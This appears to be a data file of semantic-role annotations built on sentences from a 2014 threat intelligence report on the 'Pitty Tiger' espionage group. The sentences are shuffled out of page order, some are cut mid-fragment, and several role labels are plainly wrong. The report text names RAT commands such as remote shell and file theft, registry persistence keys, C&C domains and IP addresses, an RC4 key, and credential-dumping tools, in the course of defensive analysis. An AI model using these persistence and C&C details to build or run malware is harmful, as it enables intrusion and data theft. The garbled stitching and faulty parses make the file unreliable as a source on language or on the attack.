"infected Word documents"}, "V": {"text": "showing", "index": 42}, "ARG1": {"text": "content stolen"}, "ARGM-DIR": {"text": "from victims of the group"}}, "stolen": {"ARG1": {"text": "content"}, "V": {"text": "stolen", "index": 44}, "ARG2": {"text": "from victims of the group"}}}, " According to the name of the files and the general\n    feel of the archive, we do think it was extracted by the attackers to \u201cshow\u201d someone what kind of\n    data they could get from the compromise of that particular target": {"According": {"V": {"text": "According", "index": 0}}, "do": {"V": {"text": "do", "index": 16}}, "think": {"ARGM-ADV": {"text": "According to the name of the files and the general feel of the archive"}, "ARG0": {"text": "we"}, "V": {"text": "think", "index": 17}, "ARG1": {"text": "it was extracted by the attackers to \u201c show \u201d someone what kind of data they could get from the compromise of that particular target"}}, "was": {"V": {"text": "was", "index": 19}}, "extracted": {"ARG1": {"text": "it"}, "V": {"text": "extracted", "index": 20}, "ARG2": {"text": "by the attackers"}, "ARGM-PRP": {"text": "to \u201c show \u201d someone what kind of data they could get from the compromise of that particular target"}}, "show": {"V": {"text": "show", "index": 26}, "ARG1": {"text": "\u201d someone what kind of data they could get from the compromise of that particular target"}}, "could": {"V": {"text": "could", "index": 34}}, "get": {"ARG1": {"text": "what kind of data"}, "ARG0": {"text": "they"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "get", "index": 35}, "ARG2": {"text": "from the compromise of that particular target"}}}, "\n\n</section>\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 6/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<section>\n            <heading>DATA EXFILTRATION</heading>\n\n    Data exfiltration is the last step before the attackers loop to the lateral moves step, in a never-ending\n    circle of prolonged access and information theft": {"is": {"ARG1": {"text": "Data exfiltration"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "the last step"}, "ARGM-TMP": {"text": "before the attackers loop to the lateral moves step"}, "ARGM-PRD": {"text": "in a never - ending circle of prolonged access and information theft"}}, "ending": {"ARGM-NEG": {"text": "never"}, "V": {"text": "ending", "index": 20}, "ARG0": {"text": "circle"}}, "prolonged": {"V": {"text": "prolonged", "index": 23}, "ARG1": {"text": "access"}}}, "\n    These addresses are listed below:\n<list>\n        -   63.251.83.36\n        -   64.74.96.242\n        -   69.251.142.1\n        -   212.118.243.118\n        -   216.52.184.230\n        -   61.145.112.78\n        -   218.16.121.32\n</list>\n</section>\n<section>\n    <heading>Command & Control</heading>\n\n    It starts resolving its domains after injection, and immediately sends requests": {"are": {"V": {"text": "are", "index": 2}}, "listed": {"ARG1": {"text": "These addresses"}, "V": {"text": "listed", "index": 3}, "ARG2": {"text": "below"}}, "starts": {"V": {"text": "starts", "index": 7}, "ARG1": {"text": "resolving its domains after injection"}}, "resolving": {"ARG0": {"text": "It"}, "V": {"text": "resolving", "index": 8}, "ARG1": {"text": "its domains"}, "ARGM-TMP": {"text": "after injection"}}, "sends": {"ARG0": {"text": "It"}, "ARGM-TMP": {"text": "immediately"}, "V": {"text": "sends", "index": 16}, "ARG1": {"text": "requests"}}}, "\n\n\n\n<footnote>\n    1\n     http://nakedsecurity.sophos.com/2012/08/03/poisoned-doc-targeted-malware-attack/\n    2\n     http://nakedsecurity.sophos.com/2010/06/24/targeted-trident-cyberattack-defence-company/\n</footnote>\n</section>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 8/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n<section>\n<heading>\n    INFECTION METHODS\n</heading>\n</section>\n<section>\n          <heading>SPEAR PHISHING AND WEAPONIZED DOCUMENTS</heading>\n\n    Pitty Tiger, like most other APT groups, use spear phishing e-mails extensively in order to gain an\n    initial foothold within the targeted environment": {"use": {"ARG0": {"text": "Pitty Tiger"}, "ARGM-MNR": {"text": "like most other APT groups"}, "V": {"text": "use", "index": 9}, "ARG1": {"text": "spear phishing e - mails extensively"}, "ARGM-PRP": {"text": "in order to gain an initial foothold within the targeted environment"}}, "phishing": {"V": {"text": "phishing", "index": 11}, "ARG1": {"text": "e - mails"}}, "gain": {"ARG0": {"text": "Pitty Tiger"}, "V": {"text": "gain", "index": 19}, "ARG1": {"text": "an initial foothold within the targeted environment"}}, "targeted": {"V": {"text": "targeted", "index": 25}, "ARG1": {"text": "environment"}}}, " It acts\n    as a first stage downloader and system data collector often used in the initial compromise of the\n    Pitty Tiger campaigns, generally embedded in Microsoft Office documents": {"acts": {"ARG0": {"text": "It"}, "V": {"text": "acts", "index": 1}, "ARG1": {"text": "as a first stage downloader and system data collector often used in the initial compromise of the Pitty Tiger campaigns , generally embedded in Microsoft Office documents"}}, "used": {"ARG1": {"text": "a first stage downloader and system data collector"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "used", "index": 12}, "ARGM-LOC": {"text": "in the initial compromise of the Pitty Tiger campaigns"}}, "embedded": {"ARGM-ADV": {"text": "generally"}, "V": {"text": "embedded", "index": 24}, "ARG2": {"text": "in Microsoft Office documents"}}}, "\n\n    We discovered several different documents spreading this malware by triggering CVE-2012-0158\n    vulnerability, yet we could not share them in this report, since these documents contain information\n    about victims of the Pitty Tiger group": {"discovered": {"ARG0": {"text": "We"}, "V": {"text": "discovered", "index": 1}, "ARG1": {"text": "several different documents spreading this malware by triggering CVE-2012 - 0158 vulnerability"}}, "spreading": {"ARG0": {"text": "several different documents"}, "V": {"text": "spreading", "index": 5}, "ARG1": {"text": "this malware"}, "ARGM-MNR": {"text": "by triggering CVE-2012 - 0158 vulnerability"}}, "triggering": {"ARG0": {"text": "We"}, "V": {"text": "triggering", "index": 9}, "ARG1": {"text": "CVE-2012 - 0158 vulnerability"}}, "could": {"V": {"text": "could", "index": 17}}, "share": {"ARG0": {"text": "we"}, "ARGM-MOD": {"text": "could"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "share", "index": 19}, "ARG1": {"text": "them"}, "ARGM-LOC": {"text": "in this report"}, "ARGM-CAU": {"text": "since these documents contain information about victims of the Pitty Tiger group"}}, "contain": {"ARG0": {"text": "these documents"}, "V": {"text": "contain", "index": 28}, "ARG1": {"text": "information about victims of the Pitty Tiger group"}}}, " In POST commands, the CGI name represents the command": {"represents": {"ARGM-LOC": {"text": "In POST commands"}, "ARG0": {"text": "the CGI name"}, "V": {"text": "represents", "index": 7}, "ARG1": {"text": "the command"}}}, " The controllers for these RATs show Chinese language;\n        \uf0b7   Several binaries used by the attackers show either \u201cChinese - China\u201d or \u201cChinese-Taiwan\u201d\n            language ID in their resources;\n        \uf0b7   A decoy Word document has been found, written in Chinese language;\n</list>\n    The IP addresses used for the hosting of the c&c domains are mainly located in Taipei (Ta\u00efwan) and\n    Hong Kong City (Hong Kong Special Administrative Region, PRC):\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 53/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n\n                          <caption>Hosting information links for the c&c servers used in this campaign</caption>\n\n\n\n    Most RDP connections to the c&c infrastructure come from Chinese IP ranges in Fuqing (Fujian\n    province, PRC)": {"show": {"ARG0": {"text": "The controllers for these RATs"}, "V": {"text": "show", "index": 5}, "ARG1": {"text": "Chinese language"}}, "used": {"ARG1": {"text": "Several binaries"}, "V": {"text": "used", "index": 12}, "ARG0": {"text": "by the attackers"}}, "show_2": {"ARG0": {"text": "Several binaries used by the attackers"}, "V": {"text": "show", "index": 16}, "ARG1": {"text": "either \u201c Chinese - China \u201d or \u201c Chinese - Taiwan \u201d language ID in their resources"}}, "ID": {"ARG1": {"text": "either \u201c Chinese - China \u201d or \u201c Chinese - Taiwan \u201d language"}, "V": {"text": "ID", "index": 30}, "ARGM-LOC": {"text": "in their resources"}}, "has": {"V": {"text": "has", "index": 40}}, "been": {"V": {"text": "been", "index": 41}}, "found": {"ARG1": {"text": "A decoy Word document"}, "V": {"text": "found", "index": 42}, "ARGM-PRD": {"text": "written in Chinese language"}}, "written": {"ARG1": {"text": "A decoy Word document"}, "V": {"text": "written", "index": 44}, "ARGM-MNR": {"text": "in Chinese language"}}, "come": {"ARG1": {"text": "Most RDP connections to the c&c infrastructure"}, "V": {"text": "come", "index": 56}, "ARG2": {"text": "from Chinese IP ranges in Fuqing ( Fujian province"}}, "ranges": {"ARG1": {"text": "Most RDP connections to the c&c infrastructure come from Chinese IP"}, "V": {"text": "ranges", "index": 60}, "ARG2": {"text": "in Fuqing ( Fujian province"}}}, " Furthermore, no authentication is required to send\n    commands to the c&c (but you need to know the configured password to interact with the bots)": {"is": {"V": {"text": "is", "index": 4}}, "required": {"ARGM-DIS": {"text": "Furthermore"}, "R-ARG1": {"text": "no authentication"}, "V": {"text": "required", "index": 5}, "ARG1": {"text": "to send commands to the c&c ("}}, "send": {"ARG0": {"text": "no authentication"}, "V": {"text": "send", "index": 7}, "ARG1": {"text": "commands"}, "ARG2": {"text": "to the c&c ("}}, "need": {"ARG0": {"text": "you"}, "V": {"text": "need", "index": 15}, "ARG1": {"text": "to know the configured password to interact with the bots )"}}, "know": {"ARG0": {"text": "you"}, "V": {"text": "know", "index": 17}, "ARG1": {"text": "the configured password to interact with the bots )"}}, "interact": {"ARG0": {"text": "the configured password"}, "V": {"text": "interact", "index": 22}, "ARG1": {"text": "with the bots )"}}}, "\n    Moreover, the same commands are implemented in both RATs": {"are": {"V": {"text": "are", "index": 5}}, "implemented": {"ARGM-DIS": {"text": "Moreover"}, "ARG1": {"text": "the same commands"}, "V": {"text": "implemented", "index": 6}, "ARGM-LOC": {"text": "in both RATs"}}}, "\n\n    Persistence is achieved by adding the path to the binary to the Winlogon Shell key:\n<figure>\n                 Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n                 NT\\CurrentVersion\\Winlogon\n                 Value Name: Shell\n                 Value: explorer.exe,C:\\DOCUME~1\\<UserName>\\APPLIC~1\\<binary name>,\n</figure>\n\n    The RAT embeds its own DNS server IP addresses to make the c&c domain names resolutions": {"is": {"V": {"text": "is", "index": 1}}, "achieved": {"ARG1": {"text": "Persistence"}, "V": {"text": "achieved", "index": 2}, "ARGM-MNR": {"text": "by adding the path to the binary to the Winlogon Shell key/ own DNS server IP addresses to make the c&c domain names resolutions"}}, "adding": {"V": {"text": "adding", "index": 4}, "ARG1": {"text": "the path"}, "ARG2": {"text": "to the binary to the Winlogon Shell key"}}, "embeds": {"ARG0": {"text": "The RAT"}, "V": {"text": "embeds", "index": 18}, "ARG1": {"text": "its own DNS server IP addresses"}, "ARGM-PRP": {"text": "to make the c&c domain names resolutions"}}, "addresses": {"ARG0": {"text": "its own DNS server IP"}, "V": {"text": "addresses", "index": 24}, "ARGM-PRP": {"text": "to make the c&c domain names resolutions"}}, "make": {"V": {"text": "make", "index": 26}, "ARG1": {"text": "the c&c domain names resolutions"}}}, " These documents were infecting\n    the system with Troj/ReRol.A malware, which we will detail later in this report": {"were": {"ARG1": {"text": "These documents"}, "V": {"text": "were", "index": 2}, "ARG2": {"text": "infecting the system with Troj / ReRol . A malware , which we will detail later in this report"}}, "infecting": {"ARG0": {"text": "These documents"}, "V": {"text": "infecting", "index": 3}, "ARG1": {"text": "the system with Troj / ReRol . A malware , which we will detail later in this report"}}, "will": {"V": {"text": "will", "index": 16}, "ARG1": {"text": "detail"}}, "detail": {"ARG1": {"text": "/ ReRol . A malware"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "detail", "index": 17}, "ARGM-TMP": {"text": "later"}, "ARGM-LOC": {"text": "in this report"}}}, " It immediately triggers\n    alarms on our sandbox:\n\n\n\n<figure></figure>\n                            <caption>Alarms in our sandbox system, triggered by the Troj/ReRol.A malware</caption>\n\n\n\n    The binary drops a copy of itself in the Application Data folder of the currently logged-in user:\n\n\n<figure></figure>\n\n                          <caption>Creation of a copy of the Pitty Tiger malware in a user folder in our sandbox</caption>\n\n\n\n    The malware initiates a communication to time.windows.com to check for connectivity, and then\n    communicates with the c&c server at mac.avstore.com.tw": {"triggers": {"ARG0": {"text": "It"}, "ARGM-TMP": {"text": "immediately"}, "V": {"text": "triggers", "index": 2}, "ARG1": {"text": "alarms on our sandbox"}}, "initiates": {"ARG0": {"text": "The malware"}, "V": {"text": "initiates", "index": 10}, "ARG1": {"text": "a communication to time.windows.com"}, "ARGM-PRP": {"text": "to check for connectivity"}}, "check": {"V": {"text": "check", "index": 16}, "ARG1": {"text": "for connectivity"}}, "communicates": {"ARG0": {"text": "The malware"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "communicates", "index": 22}, "ARG2": {"text": "with the c&c server"}, "ARGM-LOC": {"text": "at mac.avstore.com.tw"}}}, " Not only is it one more indicator of a probable Chinese origin, but also an\n    indicator that this server was probably used as a test base, in addition to being operational and\n    controlling infected machines from different targets": {"is": {"ARGM-ADV": {"text": "Not"}, "V": {"text": "is", "index": 2}, "ARG1": {"text": "it"}, "ARG2": {"text": "one more indicator of a probable Chinese origin , but also an indicator that this server was probably used as a test base , in addition to being operational and controlling infected machines from different targets"}}, "was": {"V": {"text": "was", "index": 20}}, "used": {"ARG1": {"text": "an/ this server"}, "R-ARG1": {"text": "that"}, "ARGM-ADV": {"text": "probably/ in addition to being operational and controlling infected machines from different targets"}, "V": {"text": "used", "index": 22}, "ARG2": {"text": "as a test base"}}, "being": {"V": {"text": "being", "index": 31}, "ARG2": {"text": "operational"}}, "controlling": {"V": {"text": "controlling", "index": 34}, "ARG1": {"text": "infected machines"}, "ARGM-PRD": {"text": "from different targets"}}}, "\n\n    The payload infecting the system is malware known as \u201cTroj/ReRol.A\u201d": {"infecting": {"ARG0": {"text": "The payload"}, "V": {"text": "infecting", "index": 2}, "ARG1": {"text": "the system"}}, "is": {"ARG1": {"text": "The payload infecting the system"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "malware known as \u201c Troj / ReRol . A \u201d"}}, "known": {"ARG1": {"text": "malware"}, "V": {"text": "known", "index": 7}, "ARG2": {"text": "as \u201c Troj / ReRol"}}}, " The hello packet, once\n    decoded, looks like the following:\n    <figure>\n\n                 --------------------------PittyTigerV1.0                           ---------------------\n                 --------------                           ^ ^            ----------------------------\n                 --------------                             ^            ----------------------------\n                 Version:NULL\n</figure>\n\n    Our sample had 3 c&c servers configured:\n<list>\n       - jackyandy.avstore.com.tw:80\n       - chanxe.avstore.com.tw:443\n       - newb02.skypetm.com.tw:80\n</list>\n    The following commands are implemented:\n<list>\n       - File Download (get) and Upload (put)\n       - Screen Capture 8bit (prtsc) and 16bit (prtsc2)\n       - Remote Shell (ocmd/ccmd)\n       - Configuration update (setserv/freshserv)\n       - Direct command execution\n</list>\n    Regarding the controller part, we found two different versions:\n<list>\n       - A Delphi binary handling PittyTiger connections only\n       - A .NET binary handling both PittyTiger and CT connections\n</list>\n    The interface handling both Pitty TIGER and CT connections is very interesting": {"decoded": {"ARG1": {"text": "The hello packet"}, "ARGM-TMP": {"text": "once"}, "V": {"text": "decoded", "index": 5}}, "looks": {"ARG0": {"text": "The hello packet"}, "ARGM-ADV": {"text": "once decoded"}, "V": {"text": "looks", "index": 7}, "ARG1": {"text": "like the following : The interface handling both Pitty TIGER and CT connections is very interesting"}}, "following": {"V": {"text": "following", "index": 10}, "ARG1": {"text": "The interface handling both Pitty TIGER and CT connections is very interesting"}}, "handling": {"ARG0": {"text": "The interface"}, "V": {"text": "handling", "index": 14}, "ARG1": {"text": "both Pitty TIGER and CT connections"}}, "is": {"ARG1": {"text": "The interface handling both Pitty TIGER and CT connections"}, "V": {"text": "is", "index": 21}, "ARG2": {"text": "very interesting"}}}, " The file is ciphered using RC4, using\n    the MD5 hash of \u201crEdstArs\u201d as the key": {"is": {"V": {"text": "is", "index": 2}}, "ciphered": {"ARG1": {"text": "The file"}, "V": {"text": "ciphered", "index": 3}, "ARGM-MNR": {"text": "using RC4/ using the MD5 hash of \u201c rEdstArs \u201d as the key"}}, "using": {"V": {"text": "using", "index": 4}, "ARG1": {"text": "RC4"}}, "using_2": {"V": {"text": "using", "index": 7}, "ARG1": {"text": "the MD5 hash of \u201c rEdstArs \u201d"}, "ARG2": {"text": "as the key"}}}, "\n\n<figure></figure>\n\n\n                                            <caption>Pitty Tiger RAT \u2013 controller part</caption>\n\n</section>\n\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 18/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<section>\n\n\n           <heading>CT RAT</heading>\n\n    This remote administration tool is often used by the Pitty Tiger group": {"is": {"V": {"text": "is", "index": 4}}, "used": {"ARG1": {"text": "This remote administration tool"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "used", "index": 6}, "ARG0": {"text": "by the Pitty Tiger group"}}}, "\n\n    Thanks to server\u2019s misconfigurations, we managed to get information from three c&c servers used\n    by this group of attackers, which provided us with insight from the end of 2013 to the beginning of\n    July 2014": {"server": {"V": {"text": "server", "index": 2}, "ARG1": {"text": "\u2019s misconfigurations"}, "ARG0": {"text": "we"}}, "managed": {"ARGM-CAU": {"text": "Thanks to server \u2019s misconfigurations"}, "ARG0": {"text": "we"}, "V": {"text": "managed", "index": 7}, "ARG1": {"text": "to get information from three c&c servers used by this group of attackers , which provided us with insight from the end of 2013 to the beginning of July 2014"}}, "get": {"ARG0": {"text": "we"}, "V": {"text": "get", "index": 9}, "ARG1": {"text": "information"}, "ARG2": {"text": "from three c&c servers used by this group of attackers , which provided us with insight from the end of 2013 to the beginning of July 2014"}}, "used": {"ARG1": {"text": "three c&c servers"}, "V": {"text": "used", "index": 15}, "ARG0": {"text": "by this group of attackers"}}, "provided": {"ARG0": {"text": "information from three c&c servers used by this group of attackers"}, "R-ARG0": {"text": "which"}, "V": {"text": "provided", "index": 23}, "ARG2": {"text": "us"}, "ARG1": {"text": "with insight from the end of 2013 to the beginning of July 2014"}}}, "\n\n    The attackers mostly rely on two techniques here to infect one or several computers, usually\n    workstations, inside the target\u2019s network: spear phishing and drive-by downloads": {"rely": {"ARG0": {"text": "The attackers"}, "ARGM-ADV": {"text": "mostly"}, "V": {"text": "rely", "index": 3}, "ARG1": {"text": "on two techniques here to infect one or several computers , usually workstations , inside the target \u2019s network : spear phishing and drive - by downloads"}}, "infect": {"V": {"text": "infect", "index": 9}, "ARG1": {"text": "one or several computers , usually workstations"}}, "drive": {"V": {"text": "drive", "index": 27}}}, " It generally does not take long before the attackers gain domain\n    administrator privileges and dump all the Active Directory content": {"does": {"V": {"text": "does", "index": 2}}, "take": {"ARGM-ADV": {"text": "generally"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "take", "index": 4}, "ARG1": {"text": "long/ before the attackers gain domain administrator privileges"}}, "gain": {"ARG0": {"text": "the attackers"}, "V": {"text": "gain", "index": 9}, "ARG1": {"text": "domain administrator privileges"}}, "dump": {"ARG0": {"text": "It"}, "ARGM-ADV": {"text": "generally"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "dump", "index": 14}, "ARG1": {"text": "all the Active Directory content"}}}, "\n\n    The RAT can then receive commands from its c&c": {"can": {"V": {"text": "can", "index": 2}}, "receive": {"ARG0": {"text": "The RAT"}, "ARGM-MOD": {"text": "can"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "receive", "index": 4}, "ARG1": {"text": "commands"}, "ARG2": {"text": "from its c&c"}}}, "\n\n    Some groups of attackers also use \u201cwatering hole\u201d techniques to successfully compromise their\n    targets": {"use": {"ARG0": {"text": "Some groups of attackers"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "use", "index": 5}, "ARG1": {"text": "\u201c watering hole \u201d techniques"}, "ARG2": {"text": "to successfully compromise their targets"}}, "compromise": {"ARGM-MNR": {"text": "successfully"}, "V": {"text": "compromise", "index": 13}, "ARG1": {"text": "their targets"}}}, "\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 48/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n\n                                         <caption>Proposal for PittyTiger team structure</caption>\n\n</section>\n<section>\n          <heading>ATTACKERS ARSENAL</heading>\n    The c&c servers used by the attackers revealed a lot of interesting files stored in various folders:\n<table>\n    Filename                    Description                                                   Public tool ?\n    32m.exe    /   3200.exe   / MM RAT                                                        No\n    ieupdate.exe / insert.exe /\n    khuvaxu.exe\n    32mm.exe / mm32.exe         CT RAT                                                        No\n    322.exe                     Chinese version of calc.exe, probably for                     Yes\n                                testing purposes\n    client.exe                  File transfer tool, via pipes                                 No\n    CP.exe/CP_sep.exe           Microsoft Outlook dumper                                      No\n    CT.exe                      Controller for CT RAT (2013.10)                               No\n    ct1.exe                     Controller for both CT RAT and PittyTiger RAT                 No\n    Diruse.exe                  Tool to display disk usage for a directory tree               Yes\n    GlobalWind.exe              Controller for Pitty Tiger                                    No\n    gsec1.exe                   GSecDump password dumper                                      Yes\n    http.exe/wsup.exe           Controller for MM RAT                                         No\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 49/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n\n    km.exe                              \u201cToyi\u201d keylogger                                       No\n    logreader.exe                       Tool to decrypt the km.exe keylogger data              No\n    Mailpv.exe                          \u201cMail PassView\u201d tool, to extract e-mail                Yes\n                                        passwords from various e-mail clients": {"decrypt": {"V": {"text": "decrypt", "index": 9}, "ARG1": {"text": "the km.exe keylogger data"}}, "extract": {"V": {"text": "extract", "index": 23}, "ARG1": {"text": "e - mail Yes passwords"}, "ARG2": {"text": "from various e - mail clients"}}}, "\n\n    Persistence is achieved via the following registry key:\n    <figure>\n\n              Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n              NT\\CurrentVersion\\Windows\n              Value Name: load\n              Value: c:\\PROGRA~1\\INTERN~1\\ieupdate.exe\n</figure>\n\n    After injection, the RAT sends a first login packet to its c&c:\n\n<figure></figure>\n\n\n                             <caption>Encrypted communication from a machine infected with CT RAT</caption>\n</section>\n<section>\n    <heading>Command & Control</heading>\n\n    The RAT communication is performed through HTTP requests": {"is": {"V": {"text": "is", "index": 1}}, "achieved": {"ARG1": {"text": "Persistence"}, "V": {"text": "achieved", "index": 2}, "ARGM-MNR": {"text": "via the following registry key"}}, "following": {"V": {"text": "following", "index": 5}, "ARG1": {"text": "registry"}}, "is_2": {"V": {"text": "is", "index": 12}}, "performed": {"ARG1": {"text": "The RAT communication"}, "V": {"text": "performed", "index": 13}, "ARGM-MNR": {"text": "through HTTP requests"}}}, "\n\n    This could mean that the Pitty Tiger group is using stolen material as spear phishing content either\n    to target other persons in the compromised company, or to target other persons in a competitor\u2019s\n    company, or more generally to compromise another target": {"could": {"V": {"text": "could", "index": 1}}, "mean": {"ARG0": {"text": "This"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "mean", "index": 2}, "ARG1": {"text": "that the Pitty Tiger group is using stolen material as spear phishing content either to target other persons in the compromised company , or to target other persons in a competitor \u2019s company , or more generally to compromise another target"}}, "is": {"V": {"text": "is", "index": 8}}, "using": {"ARG0": {"text": "the Pitty Tiger group"}, "V": {"text": "using", "index": 9}, "ARG1": {"text": "stolen material as spear phishing content"}, "ARG2": {"text": "either to target other persons in the compromised company , or to target other persons in a competitor \u2019s company , or more generally to compromise another target"}}, "stolen": {"V": {"text": "stolen", "index": 10}, "ARG1": {"text": "material"}}, "phishing": {"V": {"text": "phishing", "index": 14}, "ARG1": {"text": "content"}}, "target": {"ARG0": {"text": "the Pitty Tiger group"}, "V": {"text": "target", "index": 18}, "ARG1": {"text": "other persons"}, "ARGM-LOC": {"text": "in the compromised company"}}, "compromised": {"V": {"text": "compromised", "index": 23}, "ARG1": {"text": "company"}}, "target_2": {"ARG0": {"text": "the Pitty Tiger group"}, "V": {"text": "target", "index": 28}, "ARG1": {"text": "other persons"}, "ARGM-LOC": {"text": "in a competitor \u2019s company"}}, "compromise": {"ARG0": {"text": "the Pitty Tiger group"}, "V": {"text": "compromise", "index": 41}, "ARG1": {"text": "another target"}}}, " The attackers loop to the access strengthening/lateral\n    moves stage and generally keep stealing more information and stay inside the network for more\n    data gathering": {"strengthening": {"V": {"text": "strengthening", "index": 6}}, "keep": {"ARG0": {"text": "The attackers loop to the access strengthening / lateral"}, "ARGM-ADV": {"text": "generally"}, "V": {"text": "keep", "index": 13}, "ARG1": {"text": "stealing more information"}}, "stealing": {"ARG0": {"text": "The attackers loop to the access strengthening / lateral"}, "ARGM-ADV": {"text": "generally"}, "V": {"text": "stealing", "index": 14}, "ARG1": {"text": "more information"}}, "stay": {"ARG1": {"text": "The attackers loop to the access strengthening / lateral moves stage"}, "ARGM-ADV": {"text": "generally"}, "V": {"text": "stay", "index": 18}, "ARGM-LOC": {"text": "inside the network"}, "ARGM-PRP": {"text": "for more data gathering"}}}, " We do not\n    currently know why this malware uses the same patterns to communicate": {"do": {"V": {"text": "do", "index": 1}}, "know": {"ARG0": {"text": "We"}, "ARGM-NEG": {"text": "not"}, "ARGM-TMP": {"text": "currently"}, "V": {"text": "know", "index": 4}, "ARG1": {"text": "why this malware uses the same patterns to communicate"}}, "uses": {"ARGM-CAU": {"text": "why"}, "ARG0": {"text": "this malware"}, "V": {"text": "uses", "index": 8}, "ARG1": {"text": "the same patterns"}, "ARG2": {"text": "to communicate"}}, "communicate": {"ARG0": {"text": "this malware"}, "V": {"text": "communicate", "index": 13}}}, " While some\n    targets have been scanned with \u201cgeneric\u201d vulnerability scanning tools like HScan or Fluxay and port\n    scanners like Nmap, some other targets have been scanned for very specific vulnerabilities, like a\n    ZyWALL vulnerability or a FORTINET product": {"have": {"V": {"text": "have", "index": 3}}, "been": {"V": {"text": "been", "index": 4}}, "scanned": {"ARG1": {"text": "some targets"}, "V": {"text": "scanned", "index": 5}, "ARGM-COM": {"text": "with \u201c generic \u201d vulnerability scanning tools like HScan or Fluxay and port scanners like Nmap"}}, "scanning": {"V": {"text": "scanning", "index": 11}, "ARG0": {"text": "tools"}}, "have_2": {"V": {"text": "have", "index": 26}}, "been_2": {"V": {"text": "been", "index": 27}}, "scanned_2": {"ARGM-ADV": {"text": "While some targets have been scanned with \u201c generic \u201d vulnerability scanning tools like HScan or Fluxay and port scanners like Nmap"}, "ARG1": {"text": "some other targets"}, "V": {"text": "scanned", "index": 28}, "ARGM-GOL": {"text": "for very specific vulnerabilities/ like a ZyWALL vulnerability or a FORTINET product"}}}, " The following alarms are\n    triggered in the sandbox:\n\n\n<figure></figure>\n\n                               <caption>Alarms in our sandbox system, triggered by the Paladin RAT</caption>\n\n    The shellcode contained in the Word file drops the following file, and executes it:\n<list>\n       - C:\\Documents and Settings\\<User>\\Local Settings\\Temp\\svohost.exe<fn>2</fn>\n</list>\n    This one drops in turn the following file:\n\n\n<footnote>\n\n    1\n        http://la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf\n    2\n        MD5 hash: 0567fd7484efbae502cac279d32ed518\n        </footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 26/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n<figure></figure>\n                                      <caption>File dropped by the malware in our sandbox</caption>\n\n    This tmp file is then copied to \u201cC:\\Windows\\system32\\Nwsapagentex.dll\u201d and registered as a service\n    called \u201cNwsapagent\u201d": {"following": {"V": {"text": "following", "index": 1}, "ARG2": {"text": "alarms"}}, "are": {"V": {"text": "are", "index": 3}}, "triggered": {"ARG1": {"text": "The following alarms"}, "V": {"text": "triggered", "index": 4}, "ARGM-LOC": {"text": "in the sandbox"}}, "is": {"ARG1": {"text": "This tmp file"}, "V": {"text": "is", "index": 12}, "ARGM-TMP": {"text": "then"}, "ARG2": {"text": "copied to \u201c C:\\Windows\\system32\\Nwsapagentex.dll \u201d and registered as a service called \u201c Nwsapagent \u201d"}}, "copied": {"ARG1": {"text": "This tmp file"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "copied", "index": 14}, "ARGM-PRP": {"text": "to \u201c C:\\Windows\\system32\\Nwsapagentex.dll"}, "ARGM-ADV": {"text": "registered as a service called \u201c Nwsapagent \u201d"}}, "registered": {"ARG1": {"text": "This tmp file"}, "V": {"text": "registered", "index": 20}, "ARG2": {"text": "as a service called \u201c Nwsapagent \u201d"}}, "called": {"ARG1": {"text": "a service"}, "V": {"text": "called", "index": 24}, "ARG2": {"text": "\u201c Nwsapagent \u201d"}}}, "\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 20/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n\n    The Login packet contains the following string, after decoding and deciphering:\n<figure>\n          